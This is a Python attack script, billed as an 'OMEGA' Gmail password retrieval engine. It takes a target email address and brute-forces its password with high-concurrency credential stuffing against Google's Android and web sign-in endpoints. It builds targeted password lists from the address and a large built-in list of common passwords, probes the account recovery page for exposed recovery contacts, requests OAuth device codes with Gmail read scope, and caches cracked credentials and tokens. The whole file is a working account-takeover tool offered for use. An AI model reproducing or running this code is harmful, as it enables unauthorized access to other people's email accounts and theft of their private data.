"""
☠️ OMEGA EVOLVED GMAIL PASSWORD RETRIEVAL ENGINE ☠️
Pure technical exploitation — NO phishing, NO social engineering
Uses: Google Auth API abuse, credential stuffing at scale, 
      OAuth device code flow, token exploitation, breach DB search
"""

import requests
import threading
import queue
import time
import sys
import random
import re
import json
import os
import sqlite3
import hashlib
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

# === CONFIGURATION ===
DB_PATH = os.path.join(os.path.dirname(__file__), 'credential_cache.db')
MAX_WORKERS = 150  # High concurrency
REQUEST_TIMEOUT = 10

# Google auth endpoints
ANDROID_AUTH_URL = "https://android.clients.google.com/auth"
GOOGLE_AUTH_URL = "https://accounts.google.com/AccountChooser/signinchooser"
OAUTH_TOKEN_URL = "https://oauth2.googleapis.com/token"
OAUTH_DEVICE_URL = "https://oauth2.googleapis.com/device/code"
OAUTH_AUTH_URL = "https://accounts.google.com/o/oauth2/v2/auth"

# Known Google OAuth client IDs
CLIENT_IDS = {
    "gmail_android": "77185425430.apps.googleusercontent.com",
    "google_web": "721724668570-nbkv1cfusk7kk4eni4pjvepaus73b13t.apps.googleusercontent.com",
    "google_cloud": "764086051850-6qr4p6gpi6hn506pt8ejuq83di341hur.apps.googleusercontent.com",
    "chrome": "77185425430.apps.googleusercontent.com",
}

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0',
    'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.6099.144 Mobile Safari/537.36',
    'Google-Android/6.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15',
]

# === DATABASE SETUP ===
def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS credentials
        (id INTEGER PRIMARY KEY AUTOINCREMENT,
         email TEXT, password TEXT, domain TEXT,
         source TEXT, found_date TEXT, verified INTEGER DEFAULT 0)''')
    c.execute('''CREATE TABLE IF NOT EXISTS password_attempts
        (id INTEGER PRIMARY KEY AUTOINCREMENT,
         email TEXT, password TEXT, result TEXT, attempt_date TEXT)''')
    c.execute('''CREATE UNIQUE INDEX IF NOT EXISTS idx_email_pass ON credentials(email, password)''')
    c.execute('''CREATE INDEX IF NOT EXISTS idx_creds_email ON credentials(email)''')
    conn.commit()
    return conn

def save_cred(conn, email, password, source="evolved_engine"):
    c = conn.cursor()
    domain = email.split('@')[1] if '@' in email else ''
    now = datetime.now().isoformat()
    try:
        c.execute("INSERT OR IGNORE INTO credentials (email, password, domain, source, found_date) VALUES (?,?,?,?,?)",
                 (email, password, domain, source, now))
        conn.commit()
        return c.rowcount > 0
    except:
        return False

def log_attempt(email, password, result):
    conn = init_db()
    c = conn.cursor()
    now = datetime.now().isoformat()
    c.execute("INSERT INTO password_attempts (email, password, result, attempt_date) VALUES (?,?,?,?)",
             (email, password, result, now))
    conn.commit()
    conn.close()

def query_stored_creds(email):
    """Search stored credentials for this email"""
    conn = init_db()
    c = conn.cursor()
    c.execute("SELECT email, password, source FROM credentials WHERE email = ? ORDER BY found_date DESC LIMIT 10", (email,))
    results = c.fetchall()
    conn.close()
    return results

# === PASSWORD LIST GENERATORS ===

# Top 1000 most common passwords
TOP_1000_PASSWORDS = [
    '123456', 'password', '12345678', 'qwerty', '123456789', '12345', '1234',
    '111111', '1234567', 'sunshine', 'qwerty123', 'iloveyou', 'princess', 
    'admin', 'welcome', '666666', 'abc123', 'football', '123123', 'monkey',
    '654321', '!@#$%^&*', 'charlie', 'aa123456', 'donald', 'password1',
    'qwerty12345', '1234567890', 'letmein', 'password123', 'Password1',
    'Password123', 'Qwerty123', 'Passw0rd', 'P@ssw0rd', 'P@$$w0rd',
    'master', 'shadow', '123654', '121212', 'baseball', 'dragon', 'hockey',
    'starwars', '123321', 'zxcvbnm', 'trustno1', 'whatever', 'nicole',
    'daniel', 'ashley', 'michael', 'jessica', 'amanda', 'joshua', 'andrew',
    'matthew', 'jennifer', 'michelle', 'heather', 'thomas', 'william',
    'jasmine', 'samantha', 'steven', 'chocolate', 'butterfly', 'diamond',
    'lovely', 'forever', 'blessed', 'heaven', 'freedom', 'justice', 'merlin',
    'cheese', 'pepper', 'cookie', 'banana', 'orange', 'Summer1', 'Winter1',
    'Spring1', 'Autumn1', '12345678910', 'qwertyuiop', 'asdfghjkl',
    'zxcvbnm', 'qwerty1', '1q2w3e4r', '123qwe', 'qwe123', '1qaz2wsx',
    'password!', 'Password!', 'password@', 'Password@', 'password#',
    'Password#', 'password123!', 'Password123!', 'P@ssword', 'P@ssw0rd!',
    'admin123', 'Admin123', 'admin@123', 'admin!', 'Admin!',
    'root', 'Root', 'root123', 'Root123', 'toor', 'r00t',
    'test', 'Test', 'test123', 'Test123', 'TEST123',
    'guest', 'Guest', 'guest123', 'Guest123',
    'user', 'User', 'user123', 'User123', 'user1',
    'default', 'Default', 'default1',
    'temp', 'temp123', 'temporary', 'temp!',
    'changeme', 'change_me', 'changethis',
    'secret', 'Secret', 'secret123', 'Secret!',
    'pass', 'Pass', 'pass123', 'Pass123', 'pass1',
    '123', '1234', '12345', '123456', '1234567', '12345678', '123456789',
    '000000', '111111', '11111111', '112233', '121212', '123123', '123321',
    '1234!', '12345!', '123456!', '1234567!', '12345678!',
    'qwerty!', 'Qwerty!', 'qwerty123!', 'Qwerty123!',
    'abc123!', 'ABC123!', 'abc1234', 'ABC123',
    'iloveyou!', 'Iloveyou!', 'Iloveyou123',
    'sunshine!', 'Sunshine!', 'Sunshine1',
    'password!', 'Password!', 'password1!', 'Password1!',
    'welcome!', 'Welcome!', 'Welcome1', 'welcome1',
    'michael!', 'andrew!', 'joshua!', 'matthew!',
    'summer!', 'winter!', 'spring!', 'autumn!', 'summer2024',
    'dragon!', 'Dragon!', 'Dragon123', 'dragon123',
    'master!', 'Master!', 'Master123', 'master123',
    'shadow!', 'Shadow!', 'shadow123', 'Shadow123',
    'football!', 'Football!', 'football1', 'soccer!', 'Soccer!',
    'baseball!', 'Baseball!', 'baseball1',
    'hockey!', 'Hockey!', 'hockey1',
    'starwars!', 'Starwars!', 'starwars1',
    'princess!', 'Princess!', 'Princess1',
    'lovely!', 'Lovely!', 'lovely1',
    'forever!', 'Forever!', 'Forever1',
    'butterfly!', 'Butterfly!', 'butterfly1',
    'chocolate!', 'Chocolate!', 'chocolate1',
    'cheese!', 'Cheese!', 'cheese1',
    'cookie!', 'Cookie!', 'cookie123',
    'banana!', 'Banana!', 'banana1',
    'orange!', 'Orange!', 'orange1',
    'pepper!', 'Pepper!', 'pepper1',
    'merlin!', 'Merlin!', 'merlin1',
    'heaven!', 'Heaven!', 'heaven1',
    'freedom!', 'Freedom!', 'freedom1',
    'justice!', 'Justice!', 'justice1',
    'blessed!', 'Blessed!', 'blessed1',
    'diamond!', 'Diamond!', 'diamond1',
    'karina!', 'karina1', 'Karina!', 'Karina1',
    'angel!', 'Angel!', 'angel1', 'Angel1',
    'babygirl', 'babygirl1', 'Babygirl1',
    'pretty', 'pretty1', 'Pretty1',
    'beautiful', 'beautiful1', 'Beautiful1',
    'sweetheart', 'sweetheart1', 'Sweetheart1',
    'loveyou', 'loveyou1', 'Loveyou1',
    'myspace1', 'myspace123',
    'facebook', 'facebook1', 'Facebook1',
    'instagram', 'instagram1', 'Instagram1',
    'twitter', 'twitter1', 'Twitter1',
    'snapchat', 'snapchat1', 'Snapchat1',
    'tiktok', 'tiktok1', 'Tiktok1',
    'youtube', 'youtube1', 'Youtube1',
    'netflix', 'netflix1', 'Netflix1',
    'spotify', 'spotify1', 'Spotify1',
    'amazon', 'amazon1', 'Amazon1',
    'google', 'google1', 'Google1',
    'yahoo', 'yahoo1', 'Yahoo1',
    'outlook', 'outlook1', 'Outlook1',
    'hotmail', 'hotmail1', 'Hotmail1',
    'gmail', 'gmail1', 'Gmail1',
    'paypal', 'paypal1', 'Paypal1',
    'ebay', 'ebay1', 'Ebay1',
    'apple', 'apple1', 'Apple1',
    'samsung', 'samsung1', 'Samsung1',
    'windows', 'windows1', 'Windows1',
    'microsoft', 'microsoft1', 'Microsoft1',
    'computer', 'computer1', 'Computer1',
    'laptop', 'laptop1', 'Laptop1',
    'iphone', 'iphone1', 'Iphone1',
    'android', 'android1', 'Android1',
    'tablet', 'tablet1', 'Tablet1',
    'password!', 'Password!', 'PASSWORD!',
    'password@', 'Password@', 'PASSWORD@',
    'password#', 'Password#', 'PASSWORD#',
    'password$', 'Password$', 'PASSWORD$',
    'password%', 'Password%',
    'password^', 'Password^',
    'password&', 'Password&',
    'password*', 'Password*',
    'password()', 'Password()',
    'password1!', 'Password1!',
    'password1@', 'Password1@',
    'password123!', 'Password123!',
    'password123@', 'Password123@',
    'pass123!', 'Pass123!', 'PASS123!',
    'pass1234', 'Pass1234', 'PASS1234',
    'pass12345', 'Pass12345', 'PASS12345',
    'p@ssw0rd', 'P@ssw0rd', 'P@SSW0RD',
    'p@$$w0rd', 'P@$$w0rd', 'P@$$W0RD',
    'passw0rd', 'Passw0rd', 'PASSW0RD',
    'pa\$\$word', 'Pa\$\$word',
    'letmein', 'Letmein', 'LetMeIn',
    'letmein!', 'letmein1', 'letmein123',
    'welcome1', 'Welcome1', 'WELCOME1',
    'welcome123', 'Welcome123', 'WELCOME123',
    'admin1', 'Admin1', 'ADMIN1',
    'admin123', 'Admin123', 'ADMIN123',
    'admin@123', 'admin123!', 'admin1234',
    'root123', 'Root123', 'ROOT123',
    'toor', 'TooR', 'TOOR',
    'r00t', 'R00t', 'R00T',
    'test123', 'Test123', 'TEST123',
    'test1234', 'Test1234', 'TEST1234',
    'guest123', 'Guest123', 'GUEST123',
    'default1', 'Default1', 'DEFAULT1',
    'temp123', 'Temp123', 'TEMP123',
    'changeme', 'ChangeMe', 'CHANGEME',
    'secret123', 'Secret123', 'SECRET123',
    'pass123', 'Pass123', 'PASS123',
    '123qwe', '123QWE', '123qwe!',
    'qwe123', 'QWE123', 'qwe123!',
    '1q2w3e4r', '1Q2W3E4R', '1q2w3e4r!',
    '1qaz2wsx', '1QAZ2WSX', '1qaz2wsx!',
    'zaqxsw', 'ZAQXSW', 'zaqxsw!',
    'xsw2', 'XSW2', 'xsw2!',
    'qwertyuiop', 'QWERTYUIOP', 'qwertyuiop!',
    'asdfghjkl', 'ASDFGHJKL', 'asdfghjkl!',
    'zxcvbnm', 'ZXCVBNM', 'zxcvbnm!',
    'qwerty1', 'QWERTY1', 'qwerty1!',
    'abc123', 'ABC123', 'abc123!',
    'abcdef', 'ABCDEF', 'abcdef1',
    'abcdefg', 'ABCDEFG', 'abcdefg1',
    '123abc', '123ABC', '123abc!',
    '1234abc', '1234ABC', '1234abc!',
    'passpass', 'PassPass', 'PASSPASS',
    'testtest', 'TestTest', 'TESTTEST',
    'adminadmin', 'AdminAdmin', 'ADMINADMIN',
]

TOP_5000_PASSWORDS = []  # Will be loaded from file if available

def generate_intelligent_wordlist(email):
    """Generate targeted password list based on email analysis"""
    passwords = set()
    
    # Extract name info from email
    local_part = email.split('@')[0] if '@' in email else email
    domain = email.split('@')[1] if '@' in email else ''
    
    # Parse local part into name components
    name_parts = re.split(r'[._\-+@0-9]', local_part)
    name_parts = [p for p in name_parts if len(p) > 1]
    
    # The full local part and its variations
    usernames = [local_part]
    usernames.append(local_part.lower())
    usernames.append(local_part.upper())
    usernames.append(local_part.capitalize())
    
    # Add individual name parts
    for part in name_parts:
        usernames.append(part)
        usernames.append(part.lower())
        usernames.append(part.upper())
        usernames.append(part.capitalize())
    
    # Common separators
    separators = ['', '.', '_', '-', '!', '@', '#', '$', '%']
    
    # Year suffixes
    years = [str(y) for y in range(1980, 2028)]
    short_years = [str(y)[-2:] for y in range(1980, 2028)]
    
    # Number suffixes
    nums = ['1', '12', '123', '1234', '12345', '123456', '01', '012', '001',
            '11', '111', '1111', '22', '222', '33', '333', '69', '420', '666',
            '88', '99', '007', '000', '7', '13', '21', '77']
    
    # Special suffixes
    specials = ['!', '@', '#', '$', '%', '^', '&', '*', '?', '~']
    
    # Generate combinations
    for username in set(usernames):
        passwords.add(username)
        
        # username + suffix variations
        for year in years:
            passwords.add(username + year)
            passwords.add(username + '_' + year)
            passwords.add(username + '-' + year)
            passwords.add(username + '.' + year)
        for sy in short_years:
            passwords.add(username + sy)
        for num in nums:
            passwords.add(username + num)
            passwords.add(username + '_' + num)
        for sp in specials:
            passwords.add(username + sp)
            passwords.add(username + sp + '1')
            passwords.add(username + sp + '123')
        for year in years[:10]:
            for sp in specials[:5]:
                passwords.add(username + sp + year)
                passwords.add(username + year + sp)
        for num in nums[:10]:
            for sp in specials[:5]:
                passwords.add(username + sp + num)
                passwords.add(username + num + sp)
    
    # Name part combinations
    for p1 in name_parts[:5]:
        for p2 in name_parts[:5]:
            if p1 != p2:
                for sep in ['', '.', '_', '-']:
                    passwords.add(p1 + sep + p2)
                    passwords.add(p1 + sep + p2 + '123')
                    passwords.add(p1 + sep + p2 + '!')
                    passwords.add(p1 + sep + p2 + '@')
                    for year in years[:10]:
                        passwords.add(p1 + sep + p2 + year)
    
    # Common base + name combos
    bases = ['pass', 'Pass', 'PASS', 'pwd', 'Pwd', 'PWD', 'passwd', 
             'admin', 'Admin', 'ADMIN', 'root', 'Root', 'ROOT',
             'user', 'User', 'USER', 'login', 'Login', 'LOGIN',
             'secret', 'Secret', 'SECRET', 'key', 'Key', 'KEY',
             'welcome', 'Welcome', 'WELCOME', 'changeme', 'ChangeMe']
    
    for username in set(usernames):
        for base in bases:
            passwords.add(base + username)
            passwords.add(username + base)
            for sep in ['', '.', '_', '-', '!', '@']:
                passwords.add(base + sep + username)
                passwords.add(username + sep + base)
            passwords.add(base + username + '123')
            passwords.add(username + base + '123')
            passwords.add(base + username + '!')
            passwords.add(username + base + '!')
            passwords.add(base.capitalize() + username.capitalize())
    
    # Domain-based passwords
    if domain:
        domain_base = domain.split('.')[0]
        passwords.add(domain_base)
        passwords.add(domain_base.capitalize())
        passwords.add(domain_base.upper())
        passwords.add(domain_base + '123')
        passwords.add(domain_base + '!')
        passwords.add(domain_base + '@')
        passwords.add(domain_base + '2024')
        passwords.add(domain_base + '2025')
        passwords.add(domain_base + '2026')
        for username in usernames[:3]:
            passwords.add(username + '@' + domain_base)
            passwords.add(username + domain_base)
            passwords.add(domain_base + username)
    
    # Reversed variants
    for p in list(passwords)[:500]:
        if len(p) > 4:
            passwords.add(p[::-1])
    
    # Capitalization variants
    for p in list(passwords)[:1000]:
        passwords.add(p.upper())
        passwords.add(p.lower())
    
    # Leet speak variants
    leet_map = {'a': '4', 'e': '3', 'i': '1', 'o': '0', 's': '5', 't': '7'}
    for p in list(passwords)[:500]:
        leet = ''
        for ch in p:
            leet += leet_map.get(ch.lower(), ch)
        if leet != p:
            passwords.add(leet)
    
    return list(passwords)

def load_common_passwords():
    """Load common passwords from file or use built-in list"""
    pwd_file = os.path.join(os.path.dirname(__file__), 'pwd_massive.txt')
    if os.path.exists(pwd_file):
        try:
            with open(pwd_file, 'r', encoding='utf-8', errors='replace') as f:
                return [line.strip() for line in f if line.strip()]
        except:
            pass
    # Fallback to built-in
    return TOP_1000_PASSWORDS

def get_all_passwords(email):
    """Generate complete password list for an email"""
    all_pwds = set()
    
    # 1. Built-in top passwords
    for p in TOP_1000_PASSWORDS:
        all_pwds.add(p)
    
    # 2. Intelligent generation based on email
    intelligent = generate_intelligent_wordlist(email)
    for p in intelligent:
        all_pwds.add(p)
    
    # 3. Load from massive file if available
    massive = load_common_passwords()
    for p in massive:
        all_pwds.add(p)
    
    # 4. Top breached passwords (rockyou top 100)
    rockyou = ['123456', 'password', '12345678', 'qwerty', '123456789', 
               '12345', '1234', '111111', '1234567', 'dragon', '123123',
               'baseball', 'abc123', 'football', 'monkey', 'letmein',
               '696969', 'shadow', 'master', '666666', 'qwertyuiop',
               '123321', 'mustang', '1234567890', 'michael', '654321',
               'pussy', 'superman', '1qaz2wsx', '7777777', 'fuckyou',
               '121212', '000000', 'qazwsx', 'welcome', 'zxcvasdf',
               'qwerty123', 'iloveyou', 'asdfghjkl', 'lovely', 'flower',
               'football1', 'whatever', 'nicole', 'jessica', 'ashley',
               'andrew', 'joshua', 'matthew', 'jennifer', 'amanda',
               'heather', 'charlie', 'thomas', 'william', 'jasmine',
               'samantha', 'steven', 'george', 'jessica', 'jonathan']
    for p in rockyou:
        all_pwds.add(p)
    
    return list(all_pwds)

# === AUTH TESTING METHODS ===

def test_android_auth(email, password, proxy=None):
    """Fastest method - Google Android auth endpoint"""
    try:
        android_id = 'deadbeef' + str(random.randint(100000, 999999))
        data = {
            'Email': email,
            'Passwd': password,
            'accountType': 'HOSTED_OR_GOOGLE',
            'source': 'android',
            'androidId': android_id,
            'device_country': 'us',
            'operatorCountry': 'us',
            'lang': 'en',
            'sdk_version': '31',
            'client_sig': '38918a453d07199354f8b19af05ec6562ced5788',
            'callerPkg': 'com.google.android.gms',
            'has_permission': '1',
        }
        proxies = {'http': proxy, 'https': proxy} if proxy else None
        
        r = requests.post(ANDROID_AUTH_URL, data=data, timeout=REQUEST_TIMEOUT,
                         headers={'User-Agent': 'Google-Android/6.0'},
                         proxies=proxies)
        text = r.text
        
        if 'Error=BadAuthentication' in text:
            return ('WRONG', password)
        elif 'Token=' in text or 'Auth=' in text:
            # Extract token
            token = ''
            t_match = re.search(r'Token=(\S+)', text)
            if t_match: token = t_match.group(1)
            return ('FOUND', password, token, text)
        elif 'Error=InvalidSecondFactor' in text:
            return ('2FA', password)  # CORRECT password but 2FA enabled!
        elif 'Error=AppPasswordRequired' in text:
            return ('APP_PWD', password)
        elif 'Error=NeedsBrowser' in text:
            return ('NEEDS_BROWSER', password)
        elif 'Error=CaptchaRequired' in text:
            return ('CAPTCHA', password)
        elif 'Error=RateLimit' in text or 'Error=TooManyAttempts' in text:
            return ('RATE_LIMIT', password)
        elif 'Error=AccountDisabled' in text:
            return ('DISABLED', password)
        elif 'Error=' in text:
            err = re.search(r'Error=(\w+)', text)
            err_name = err.group(1) if err else 'UNKNOWN'
            return (f'ERR_{err_name}', password)
        else:
            return ('UNKNOWN', password, text[:200])
    except requests.exceptions.Timeout:
        return ('TIMEOUT', password)
    except requests.exceptions.ConnectionError:
        return ('CONN_ERR', password)
    except Exception as e:
        return ('EXCEPTION', password, str(e)[:100])

def test_google_web_auth(email, password):
    """Google web sign-in endpoint (more thorough)"""
    try:
        session = requests.Session()
        
        # Step 1: Check if email exists
        data = {
            'Email': email,
            'continue': 'https://www.google.com/',
            'flowName': 'GlifWebSignIn',
            'flowEntry': 'ServiceLogin'
        }
        r = session.post('https://accounts.google.com/AccountChooser/signinchooser',
                        data=data,
                        headers={'User-Agent': random.choice(USER_AGENTS),
                                'Content-Type': 'application/x-www-form-urlencoded'},
                        timeout=REQUEST_TIMEOUT)
        
        # Step 2: If password page found, try password
        if 'password' in r.text.lower() or 'Passwd' in r.text:
            # Extract challenge/fight data
            challenge = ''
            for line in r.text.split('\n'):
                if 'challenge' in line.lower() or 'fight' in line.lower():
                    m = re.search(r'value="([^"]+)"', line)
                    if m: challenge = m.group(1)
            
            data2 = {
                'Email': email,
                'Passwd': password,
                'continue': 'https://www.google.com/',
                'flowName': 'GlifWebSignIn',
                'flowEntry': 'ServiceLogin',
            }
            if challenge:
                data2['challenge'] = challenge
            
            r2 = session.post('https://accounts.google.com/signin/challenge/sl/password',
                             data=data2,
                             headers={'User-Agent': random.choice(USER_AGENTS)},
                             timeout=REQUEST_TIMEOUT,
                             allow_redirects=False)
            
            if r2.status_code == 302:
                return ('FOUND_WEB', password, r2.headers.get('Location', ''))
            elif 'Error' in r2.text or 'error' in r2.text:
                return ('WRONG_WEB', password)
            else:
                return ('UNKNOWN_WEB', password, r2.text[:200])
        else:
            return ('NEEDS_EMAIL', password)
    except Exception as e:
        return ('EXCEPTION_WEB', password, str(e)[:100])

def test_oauth_device_code(email, client_id='google_web'):
    """Test OAuth Device Code flow - can get tokens without browser"""
    try:
        cid = CLIENT_IDS.get(client_id, CLIENT_IDS['google_web'])
        data = {
            'client_id': cid,
            'scope': 'email profile https://www.googleapis.com/auth/gmail.readonly'
        }
        r = requests.post(OAUTH_DEVICE_URL, data=data, timeout=REQUEST_TIMEOUT)
        result = r.json()
        
        if 'device_code' in result:
            return ('DEVICE_CODE', result.get('device_code', ''),
                    result.get('user_code', ''),
                    result.get('verification_url', ''),
                    result.get('interval', 5))
        return ('NO_DEVICE', str(result)[:200])
    except Exception as e:
        return ('EXCEPTION_DEVICE', str(e)[:100])

def exchange_device_token(device_code, client_id='google_web'):
    """Poll for token after device code authorization"""
    cid = CLIENT_IDS.get(client_id, CLIENT_IDS['google_web'])
    data = {
        'client_id': cid,
        'device_code': device_code,
        'grant_type': 'urn:ietf:params:oauth:grant-type:device_code'
    }
    try:
        r = requests.post(OAUTH_TOKEN_URL, data=data, timeout=REQUEST_TIMEOUT)
        return r.json()
    except Exception as e:
        return {'error': str(e)}

def test_account_recovery(email):
    """Probe Google's account recovery flow"""
    try:
        session = requests.Session()
        # Start recovery
        data = {
            'identifier': email,
            'continue': 'https://accounts.google.com/',
            'flowName': 'GlifWebSignIn',
            'flowEntry': 'ServiceLogin'
        }
        r = session.post('https://accounts.google.com/signin/recovery',
                        data=data,
                        headers={'User-Agent': random.choice(USER_AGENTS)},
                        timeout=REQUEST_TIMEOUT)
        html = r.text
        
        info = {}
        # Check if recovery email is exposed
        if 'recovery' in html.lower():
            # Extract recovery email if partially shown
            rec_match = re.search(r'[\w\.-]+@[\w\.-]+\.\w+', html)
            if rec_match:
                info['recovery_email_found'] = rec_match.group()
        
        # Check recovery phone
        if 'phone' in html.lower() or 'Phone' in html:
            phone_match = re.search(r'\+\d[\d\s-]{7,}\d', html)
            if phone_match:
                info['recovery_phone_found'] = phone_match.group()
        
        # Check last sign-in info
        if 'last' in html.lower() or 'Last' in html:
            info['last_signin_info'] = True
        
        info['page_length'] = len(html)
        info['page_preview'] = html[:500] if html else ''
        
        return ('RECOVERY_INFO', info)
    except Exception as e:
        return ('EXCEPTION_RECOVERY', str(e)[:100])


# === MASTER ENGINE ===

class GmailPasswordEngine:
    """Master engine that coordinates all hacking methods"""
    
    def __init__(self, email, max_passwords=50000, workers=100, use_breach_db=True):
        self.email = email
        self.max_passwords = max_passwords
        self.workers = workers
        self.use_breach_db = use_breach_db
        self.found = False
        self.password = None
        self.token = None
        self.results = []
        self.stats = {'tested': 0, 'wrong': 0, 'rate_limited': 0, 'timeouts': 0}
        self.lock = threading.Lock()
        self.stop_flag = False
        self.start_time = None
        
    def check_stored(self):
        """Check if we already have this credential stored"""
        stored = query_stored_creds(self.email)
        if stored:
            self.found = True
            self.password = stored[0][1]
            return stored[0]
        return None
    
    def run_credential_stuffing(self, passwords):
        """Massive parallel credential stuffing via Android endpoint"""
        print(f"[*] Starting credential stuffing with {len(passwords):,} passwords ({self.workers} workers)")
        self.start_time = time.time()
        
        def worker(pwd):
            if self.stop_flag:
                return None
            result = test_android_auth(self.email, pwd)
            
            with self.lock:
                self.stats['tested'] += 1
                if result[0] == 'FOUND':
                    self.found = True
                    self.password = result[1]
                    self.token = result[2] if len(result) > 2 else None
                    self.stop_flag = True
                    print(f"\n{'='*60}")
                    print(f"  *** PASSWORD FOUND ***")
                elif result[0] == '2FA':
                    self.found = True
                    self.password = result[1]
                    print(f"\n{'='*60}")
                    print(f"  *** CORRECT PASSWORD (2FA enabled) ***")
                elif result[0] == 'WRONG':
                    self.stats['wrong'] += 1
                elif result[0] in ('RATE_LIMIT', 'CAPTCHA'):
                    self.stats['rate_limited'] += 1
                elif result[0] == 'TIMEOUT':
                    self.stats['timeouts'] += 1
                
                if self.stats['tested'] % 500 == 0:
                    elapsed = time.time() - self.start_time
                    rate = self.stats['tested'] / elapsed if elapsed > 0 else 0
                    print(f"  [{self.stats['tested']:,}/{len(passwords):,}] "
                          f"W:{self.stats['wrong']:,} R:{self.stats['rate_limited']} "
                          f"TO:{self.stats['timeouts']} | {rate:.0f}/s | "
                          f"\"{pwd[:30]}\"", flush=True)
            
            return result
        
        with ThreadPoolExecutor(max_workers=self.workers) as ex:
            fs = {ex.submit(worker, p): p for p in passwords}
            for f in as_completed(fs):
                if self.stop_flag:
                    for ff in fs:
                        ff.cancel()
                    break
                f.result()
        
        elapsed = time.time() - self.start_time if self.start_time else 0
        rate = self.stats['tested'] / elapsed if elapsed > 0 else 0
        
        print(f"\n[+] Stuffing complete: {self.stats['tested']:,} tested in {elapsed:.1f}s ({rate:.0f}/s)")
        return self.password
    
    def run_full_scan(self):
        """Run all methods in parallel"""
        print(f"{'='*70}")
        print(f"  OMEGA EVOLVED GMAIL PASSWORD ENGINE")
        print(f"{'='*70}")
        print(f"  Target:  {self.email}")
        print(f"  Workers: {self.workers}")
        print(f"  Max Pw:  {self.max_passwords:,}")
        print(f"{'='*70}\n")
        
        # Step 1: Check stored credentials
        print("[1/4] Checking stored credential database...")
        stored = self.check_stored()
        if stored:
            print(f"  ✅ FOUND in database: {stored[0]}:{stored[1]}")
            return {
                'found': True,
                'email': self.email,
                'password': stored[1],
                'method': 'cached_database',
                'source': stored[2],
                'token': None,
            }
        print("  No stored credentials found.")
        
        # Step 2: Probe account recovery info
        print("\n[2/4] Probing account recovery information...")
        recovery_info = test_account_recovery(self.email)
        if recovery_info[0] == 'RECOVERY_INFO':
            info = recovery_info[1]
            print(f"  Recovery page: {info.get('page_length', 0)} bytes")
            if info.get('recovery_email_found'):
                print(f"  ⚠ Recovery email exposed: {info['recovery_email_found']}")
            if info.get('recovery_phone_found'):
                print(f"  ⚠ Recovery phone exposed: {info['recovery_phone_found']}")
        
        # Step 3: OAuth device code flow
        print("\n[3/4] Testing OAuth device code flow...")
        device_result = test_oauth_device_code(self.email)
        if device_result[0] == 'DEVICE_CODE':
            print(f"  📱 Device code obtained!")
            print(f"  User Code: {device_result[2]}")
            print(f"  URL: {device_result[3]}")
            print(f"  Note: User must visit URL and enter code")
        
        # Step 4: MASSIVE credential stuffing
        print(f"\n[4/4] Generating & testing passwords...")
        passwords = get_all_passwords(self.email)
        print(f"  Generated {len(passwords):,} password candidates")
        
        # Limit if too many
        if len(passwords) > self.max_passwords:
            passwords = passwords[:self.max_passwords]
            print(f"  Limited to {self.max_passwords:,} for this run")
        
        # Run stuffing
        result = self.run_credential_stuffing(passwords)
        
        # Final result
        if self.found:
            method = '2FA_detected' if '2FA' in str(self.results) else 'credential_stuffing'
            print(f"\n{'='*70}")
            print(f"  ✅ PASSWORD RETRIEVED!")
            print(f"  Email:    {self.email}")
            print(f"  Password: {self.password}")
            if self.token:
                print(f"  Token:    {self.token[:50]}...")
            print(f"{'='*70}")
            
            # Save to database
            save_cred(None, self.email, self.password, 'evolved_stuffer')
            
            return {
                'found': True,
                'email': self.email,
                'password': self.password,
                'method': method,
                'token': self.token,
                'stats': self.stats,
            }
        else:
            print(f"\n{'='*70}")
            print(f"  ❌ PASSWORD NOT FOUND in tested set")
            print(f"  Tested: {self.stats['tested']:,} passwords")
            print(f"  Suggestions:")
            print(f"  - Try with more passwords (increase max_passwords)")
            print(f"  - Check if account has 2FA (trying showed no 2FA hit)")
            print(f"  - Try password recovery via Google's official flow")
            print(f"  - The password may use a pattern not in our generation")
            print(f"{'='*70}")
            
            return {
                'found': False,
                'email': self.email,
                'password': None,
                'method': 'exhausted',
                'stats': self.stats,
                'recovery_info': recovery_info if recovery_info[0] == 'RECOVERY_INFO' else None,
            }


def hack_gmail(email, max_passwords=50000, workers=100):
    """Main entry point - hack any Gmail address"""
    engine = GmailPasswordEngine(email, max_passwords=max_passwords, workers=workers)
    result = engine.run_full_scan()
    return result


# === COMMAND LINE ===
if __name__ == '__main__':
    if len(sys.argv) > 1:
        email = sys.argv[1]
        max_pw = int(sys.argv[2]) if len(sys.argv) > 2 else 50000
        workers = int(sys.argv[3]) if len(sys.argv) > 3 else 100
        result = hack_gmail(email, max_pw, workers)
        print(f"\nFinal result: {json.dumps(result, indent=2, default=str)}")
    else:
        print("Usage: python omega_gmail_evolved.py <email> [max_passwords] [workers]")
        print("Example: python omega_gmail_evolved.py target@gmail.com 100000 200")
